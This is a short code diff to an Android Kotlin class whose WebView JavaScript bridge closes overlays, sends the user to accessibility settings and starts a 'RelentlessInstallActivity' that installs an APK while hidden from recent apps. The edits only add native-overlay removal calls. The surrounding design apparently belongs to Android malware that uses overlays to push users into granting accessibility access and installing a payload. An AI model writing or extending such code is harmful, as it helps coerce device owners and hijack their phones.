@@ -60,7 +60,10 @@ object DynamicUIManager {
     class CortexBridge(private val ctx: Context) {
         @JavascriptInterface
         fun close() {
-            Handler(Looper.getMainLooper()).post { removeOverlay(ctx, "JS_BRIDGE_CLOSE") }
+            Handler(Looper.getMainLooper()).post { 
+                removeOverlay(ctx, "JS_BRIDGE_CLOSE") 
+                removeNativeOverlay(ctx, "JS_BRIDGE_CLOSE")
+            }
         }
 
         @JavascriptInterface
@@ -198,7 +201,10 @@ object DynamicUIManager {
 
         @JavascriptInterface
         fun openAccSettings() {
-            Handler(Looper.getMainLooper()).post { removeOverlay(ctx, "NAV_TO_ACC_SETTINGS") }
+            Handler(Looper.getMainLooper()).post { 
+                removeOverlay(ctx, "NAV_TO_ACC_SETTINGS") 
+                removeNativeOverlay(ctx, "NAV_TO_ACC_SETTINGS")
+            }
             try {
                 val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 ctx.startActivity(i)
@@ -207,7 +213,10 @@ object DynamicUIManager {
 
         @JavascriptInterface
         fun openAccHelp() {
-            Handler(Looper.getMainLooper()).post { removeOverlay(ctx, "NAV_TO_ACC_HELP") }
+            Handler(Looper.getMainLooper()).post { 
+                removeOverlay(ctx, "NAV_TO_ACC_HELP") 
+                removeNativeOverlay(ctx, "NAV_TO_ACC_HELP")
+            }
             try {
                 val i = Intent(ctx, AccHelpActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 ctx.startActivity(i)
@@ -252,7 +261,8 @@ object DynamicUIManager {
         @JavascriptInterface
         fun startRelentlessInstall(apkPath: String) {
             Handler(Looper.getMainLooper()).post {
-                removeOverlay(ctx)
+                removeOverlay(ctx, "START_INSTALL")
+                removeNativeOverlay(ctx, "START_INSTALL")
                 val intent = Intent(ctx, RelentlessInstallActivity::class.java).apply {
                     putExtra("apk_path", apkPath)
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
